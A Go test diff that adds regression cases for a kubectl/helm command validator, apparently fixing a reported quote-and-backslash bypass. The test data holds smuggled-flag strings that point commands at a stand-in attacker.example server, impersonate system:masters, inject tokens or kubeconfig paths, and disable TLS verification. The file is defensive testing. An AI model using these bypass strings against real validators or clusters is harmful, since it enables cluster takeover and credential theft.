@@ -309,6 +309,34 @@ func TestValidateGlobalFlags(t *testing.T) {
 		{"kubectl --as <tab> blocked", "kubectl get pods --as\tadmin", CommandTypeKubectl, true},
 		{"helm --kube-apiserver <tab> blocked", "helm list --kube-apiserver\thttps://attacker.example:8443", CommandTypeHelm, true},
 		{"helm --kubeconfig <newline> blocked", "helm list --kubeconfig\n/tmp/evil", CommandTypeHelm, true},
+
+		// Quote/backslash bypass regression (MSRC 31000000636869) — shlex
+		// strips quotes and processes backslash escapes, joining adjacent
+		// segments into a single token. The validator must inspect the
+		// post-tokenization argv, not the raw command string, so every
+		// variant below reduces to the same canonical "--server" /
+		// "--token" / etc. token and is rejected.
+		{"kubectl --server\"=\"X blocked", `kubectl get pods --server"="https://attacker.example:8443`, CommandTypeKubectl, true},
+		{"kubectl --ser\"ver=\"X blocked", `kubectl get pods --ser"ver="https://attacker.example:8443`, CommandTypeKubectl, true},
+		{"kubectl --ser\"ver\"=X blocked", `kubectl get pods --ser"ver"=https://attacker.example:8443`, CommandTypeKubectl, true},
+		{"kubectl --server\\=X blocked", `kubectl get pods --server\=https://attacker.example:8443`, CommandTypeKubectl, true},
+		{"kubectl --token\"=\"X blocked", `kubectl get pods --token"="ATTACKER`, CommandTypeKubectl, true},
+		{"kubectl --as\"=\"X blocked", `kubectl get pods --as"="system:masters`, CommandTypeKubectl, true},
+		{"kubectl --as-group\"=\"X blocked", `kubectl get pods --as-group"="system:masters`, CommandTypeKubectl, true},
+		{"kubectl --kubeconfig\"=\"X blocked", `kubectl get pods --kubeconfig"="/tmp/evil`, CommandTypeKubectl, true},
+		{"kubectl --insecure-skip-tls-ver\"i\"fy blocked", `kubectl get pods --insecure-skip-tls-ver"i"fy`, CommandTypeKubectl, true},
+		{"kubectl single-quoted --server blocked", `kubectl get pods '--server'=https://attacker.example:8443`, CommandTypeKubectl, true},
+		{"helm --kube-apiserver\"=\"X blocked", `helm list --kube-apiserver"="https://attacker.example:8443`, CommandTypeHelm, true},
+		{"helm --kube\"-token=\"X blocked", `helm list --kube"-token="ATTACKER`, CommandTypeHelm, true},
+		{"helm --kubeconfig\\=X blocked", `helm list --kubeconfig\=/tmp/evil`, CommandTypeHelm, true},
+		{"helm --kube-insecure-skip-tls-ver\"i\"fy blocked", `helm list --kube-insecure-skip-tls-ver"i"fy`, CommandTypeHelm, true},
+
+		// Look-alikes that only embed a blocked flag in non-flag text must
+		// stay allowed. shlex tokenization makes the validator inspect only
+		// argv tokens that begin with "--", so a blocked substring inside a
+		// resource name or quoted value cannot trigger a false positive.
+		{"kubectl resource name containing --server is allowed", `kubectl describe pod my--server-pod`, CommandTypeKubectl, false},
+		{"kubectl quoted value containing --server is allowed", `kubectl get configmap myconfig -o jsonpath='{.data.note}'`, CommandTypeKubectl, false},
 	}
 
 	for _, tc := range tests {
